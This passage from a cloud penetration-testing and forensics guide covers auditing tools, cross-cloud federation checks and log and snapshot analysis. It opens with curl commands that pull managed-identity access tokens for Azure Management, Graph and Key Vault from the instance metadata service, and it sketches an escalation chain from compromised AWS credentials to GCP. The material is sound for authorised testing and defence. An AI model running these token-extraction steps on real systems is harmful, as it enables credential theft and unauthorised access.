**IMDS Enumeration**:
```bash
# Query Azure IMDS
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq

# Get compute metadata
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01" | jq

# Get network metadata
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01" | jq

# Get management token
curl -H "Metadata: true" \
     "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com" | jq
```

**Managed Identity Token Extraction**:
```bash
#!/bin/bash
# Get token for different resources

# Azure Management
curl -s -H "Metadata: true" \
     "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com" | jq -r '.access_token'

# Microsoft Graph
curl -s -H "Metadata: true" \
     "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com" | jq -r '.access_token'

# Key Vault
curl -s -H "Metadata: true" \
     "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" | jq -r '.access_token'
```

---

## Cloud-Native Security Tools

A variety of specialized tools exist for cloud security testing. Understanding and leveraging these tools significantly improves assessment efficiency.

### Prowler - AWS Security Assessment

```bash
# Install Prowler
pip3 install prowler

# Basic AWS scan
prowler aws

# Scan specific checks
prowler aws --check s3_bucket_public_read_acl s3_bucket_public_write_acl

# Generate HTML report
prowler aws -M html

# Run CIS benchmark
prowler aws --compliance cis_1.5_aws

# Scan multiple regions
prowler aws -f us-east-1 -f us-west-2
```

### ScoutSuite - Multi-Cloud Security Auditing

```bash
# Install ScoutSuite
pip3 install scoutsuite

# AWS scan
scout aws --profile PROFILE_NAME --report-dir ./scoutsuite-report

# GCP scan
scout gcp --service-account credentials.json --report-dir ./scoutsuite-report

# Azure scan
scout azure --service-principal --tenant TENANT_ID --client-id APP_ID --client-secret PASSWORD \
    --report-dir ./scoutsuite-report

# View report
python -m http.server 8000 --directory ./scoutsuite-report
```

### CloudSploit - Cloud Security Scanning

```bash
# Clone and setup
git clone https://github.com/aquasecurity/cloudsploit.git
cd cloudsploit
npm install

# Configure credentials (AWS)
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# Run all plugins
./index.js --console

# Run specific plugin
./index.js --plugin acmValidation

# JSON output
./index.js --json
```

### CloudFox - Cloud Penetration Testing

```bash
# Install CloudFox
go install github.com/BishopFox/cloudfox@latest

# AWS enumeration
cloudfox aws --profile PROFILE resources
cloudfox aws --profile PROFILE instances
cloudfox aws --profile PROFILE role-trusts
cloudfox aws --profile PROFILE permissions
cloudfox aws --profile PROFILE ecr-repos

# Output to loot directory
cloudfox aws --profile PROFILE all-checks -o ./cloudfox-output
```

### Steampipe - Cloud SQL Queries

```bash
# Install Steampipe
brew install turbot/tap/steampipe

# Install AWS plugin
steampipe plugin install aws

# Query AWS resources
steampipe query "select * from aws_s3_bucket"
steampipe query "select * from aws_iam_policy where is_attached = false"

# Run benchmarks
steampipe check aws.benchmark.cis_v150

# Custom queries
cat > public_buckets.sql << 'EOF'
select
  name,
  bucket_policy_is_public,
  block_public_acls
from
  aws_s3_bucket
where
  bucket_policy_is_public = true;
EOF

steampipe query public_buckets.sql
```

### Whiz - Cloud Security Tool

```bash
# Install Whiz
pip3 install whiz

# Run comprehensive AWS scan
whiz aws --profile default --output-format json

# Scan specific services
whiz aws --services ec2,s3,iam --output-format html
```

### Trivy - Container and IaC Scanning

```bash
# Install Trivy
brew install trivy

# Scan container image
 trivy image nginx:latest

# Scan IaC (Terraform, CloudFormation)
trivy config ./terraform-directory

# Scan Kubernetes manifests
trivy config ./k8s-manifests

# Scan filesystem
trivy filesystem --scanners vuln,config,secret ./project

# Generate SARIF report
trivy image --format sarif --output report.sarif nginx:latest
```

---

## Multi-Cloud Security Considerations

Organizations increasingly adopt multi-cloud strategies, requiring penetration testers to assess security across multiple platforms simultaneously.

### Cross-Cloud Identity Federation

**AWS-GCP Federation Testing**:
```bash
# Check for workload identity federation configuration
# AWS -> GCP
gcloud iam workload-identity-pools list --location=global
gcloud iam workload-identity-pools providers list --workload-identity-pool=POOL_ID

# Verify trust relationships
gcloud iam workload-identity-pools providers describe PROVIDER_ID \
    --workload-identity-pool=POOL_ID \
    --location=global
```

**Azure-AWS Federation**:
```bash
# Check for AWS IAM roles trust with Azure AD
aws iam get-role --role-name CrossCloudRole --query 'Role.AssumeRolePolicyDocument'
```

### Cross-Cloud Data Transfer Security

**Testing Data Flow**:
```bash
# Identify storage replication between clouds
# AWS S3 Cross-Region Replication to GCS
aws s3api get-bucket-replication --bucket source-bucket

# Azure Data Factory pipelines
az datafactory pipeline list --factory-name FACTORY_NAME --resource-group RG_NAME
```

### Multi-Cloud Privilege Escalation Chains

```bash
# Example: AWS compromised credentials -> GCP access via federation

# 1. Assume federated role in AWS
aws sts assume-role \
    --role-arn arn:aws:iam::ACCOUNT_ID:role/GCPFederationRole \
    --role-session-name gcp-access

# 2. Use obtained token to impersonate GCP service account
# (Requires proper workload identity configuration)
gcloud auth activate-service-account \
    --key-file=obtained-credentials.json

# 3. Access GCP resources
gcloud compute instances list
```

---

## Cloud Incident Response and Forensics

Understanding cloud forensics is essential for comprehensive security assessments and incident response scenarios.

### AWS CloudTrail Analysis

**CloudTrail Log Analysis**:
```bash
# List trails
aws cloudtrail describe-trails

# Get trail status
aws cloudtrail get-trail-status --name TRAIL_NAME

# Search CloudTrail events
aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=EventName,AttributeValue=PutBucketPolicy \
    --max-results 50

# Query CloudTrail athena table
aws athena start-query-execution \
    --query-string "SELECT * FROM cloudtrail_logs WHERE eventtime > '2024-01-01' AND eventname = 'CreateAccessKey'" \
    --work-group primary \
    --result-configuration OutputLocation=s3://query-results-bucket/
```

**CloudTrail Analysis with jq**:
```bash
# Download and analyze CloudTrail logs
aws s3 sync s3://cloudtrail-bucket/ ./cloudtrail-logs/

# Find suspicious API calls
cat cloudtrail-logs/*.json | jq '.Records[] | select(.eventName | contains("Delete","Create","Put","Attach")) | {eventTime, eventName, sourceIPAddress, userIdentity}'

# Find failed login attempts
cat cloudtrail-logs/*.json | jq '.Records[] | select(.eventName=="ConsoleLogin" and .responseElements.ConsoleLogin=="Failure")'
```

### GCP Audit Log Analysis

**Accessing Audit Logs**:
```bash
# List log sinks
gcloud logging sinks list

# Read logs with gcloud
gcloud logging read "protoPayload.serviceName=\"compute.googleapis.com\" AND protoPayload.methodName=\"v1.compute.instances.insert\"" \
    --limit=50 \
    --format=json

# Export logs for analysis
gcloud logging read "protoPayload.authenticationInfo.principalEmail=\"attacker@domain.com\"" \
    --freshness=7d > attacker-activity.json
```

### Azure Activity Log Analysis

**Log Retrieval and Analysis**:
```bash
# Get activity logs
az monitor activity-log list --start-time 2024-01-01T00:00:00Z --output json

# Filter by resource group
az monitor activity-log list --resource-group RG_NAME --output json

# Filter by caller
az monitor activity-log list --caller user@domain.com --output json

# Export to file
az monitor activity-log list --start-time 2024-01-01T00:00:00Z > activity-logs.json
```

**Azure Sentinel Queries**:
```kusto
// Detect suspicious role assignments
AzureActivity
| where OperationName == "Create role assignment"
| where ActivityStatus == "Succeeded"
| extend RoleDefinition = parse_json(Properties).roleDefinitionName
| extend PrincipalType = parse_json(Properties).principalType
| where RoleDefinition in ("Owner", "Contributor")
| project TimeGenerated, Caller, RoleDefinition, ResourceGroup, SubscriptionId

// Detect key vault access changes
AzureDiagnostics
| where ResourceProvider == "MICROSOFT.KEYVAULT"
| where OperationName == "VaultPut"
| project TimeGenerated, Resource, OperationName, ResultSignature, callerIpAddress
```

### Snapshot Analysis for Forensics

**AWS EBS Snapshot Analysis**:
```bash
# List snapshots
aws ec2 describe-snapshots --owner-ids SELF

# Create volume from snapshot
aws ec2 create-volume \
    --snapshot-id snap-xxxxxxxx \
    --availability-zone us-east-1a \
    --volume-type gp2

# Attach and analyze
aws ec2 attach-volume \
    --volume-id vol-xxxxxxxx \
    --instance-id i-xxxxxxxx \
    --device /dev/sdf
```

**GCP Disk Snapshot Analysis**:
```bash
# List snapshots
gcloud compute snapshots list

# Create disk from snapshot
gcloud compute disks create forensics-disk \
    --source-snapshot=SNAPSHOT_NAME \
    --zone=us-central1-a

# Attach to forensics VM
gcloud compute instances attach-disk FORENSICS_VM \
    --disk=forensics-disk \
    --zone=us-central1-a
```

**Azure Snapshot Analysis**:
```bash
# List snapshots
az snapshot list --output table

# Create disk from snapshot
az disk create \
    --resource-group FORENSICS_RG \
    --name forensics-disk \
    --source SNAPSHOT_NAME

# Attach to VM
az vm disk attach \
    --vm-name FORENSICS_VM \
    --resource-group FORENSICS_RG \
    --disk forensics-disk
```

This comprehensive guide to cloud infrastructure penetration testing equips security professionals with the knowledge and tools necessary to assess modern cloud environments across AWS, GCP, and Azure. The dynamic nature of cloud services requires continuous learning and adaptation to new services, attack vectors, and defensive mechanisms.
